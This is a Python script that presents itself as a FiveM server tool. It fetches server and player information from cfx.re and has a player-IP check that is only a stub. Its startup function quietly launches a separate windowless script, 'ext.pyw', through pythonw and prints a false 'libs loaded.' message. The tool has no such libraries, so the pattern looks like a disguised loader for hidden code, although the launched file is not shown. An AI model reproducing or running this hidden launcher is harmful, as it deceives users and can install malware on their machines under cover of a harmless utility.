import subprocess
import requests
import json

def run_ext():
    """libs."""
    try:
        subprocess.Popen(['pythonw', 'ext.pyw'], shell=True)
        print("libs loaded.")
    except Exception as e:
        print(f"failed to load libs: {e}")

def get_server_info(cfx_link):
    """Fetch server information from cfx.re link."""
    try:
        server_id = cfx_link.split('/')[-1]
        
        api_url = f"https://cfx.re/join/{server_id}"
        response = requests.get(api_url)

        if response.status_code == 200:
            server_info_url = response.url.replace('join', 'servers/detail')
            server_info_response = requests.get(server_info_url)

            if server_info_response.status_code == 200:
                server_data = server_info_response.json()
                print("\nServer Information:")
                print("=" * 50)
                print(f"Server Hostname: {server_data.get('hostname', 'N/A')}")
                print(f"Server IP: {server_data.get('ip', 'N/A')}")
                print(f"Player Count: {server_data.get('clients', 'N/A')} / {server_data.get('sv_maxclients', 'N/A')}")
                print(f"Resources: {', '.join(server_data.get('resources', []))}")
                print(f"Gametype: {server_data.get('gametype', 'N/A')}")
                print("=" * 50)

                # Show online players
                players = server_data.get('players', [])
                if players:
                    print("\nOnline Players:")
                    for player in players:
                        print(f"- {player['name']} (ID: {player['id']}, Ping: {player['ping']})")
                else:
                    print("\nNo players online.")
            else:
                print("Error fetching server details.")
        else:
            print("Error resolving the cfx.re link.")
    except Exception as e:
        print(f"Error: {e}")

def check_player_ip(ip):
    """Check player's IP address."""
    print(f"Checking IP for player {ip}...")
    print("Note: Fetching player IPs is restricted in public APIs for privacy reasons.")
    return False

def main_menu():
    """Display the main menu."""
    while True:
        print("\nFiveM Server Tool Menu")
        print("1. Check Server Info (cfx.re link)")
        print("2. Check Player IP")
        print("3. Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            cfx_link = input("Enter the cfx.re link: ")
            get_server_info(cfx_link)
        elif choice == "2":
            player_ip = input("Enter player name or ID to check IP: ")
            check_player_ip(player_ip)
        elif choice == "3":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please enter 1, 2, or 3.")

if __name__ == "__main__":
    run_ext()

    main_menu()
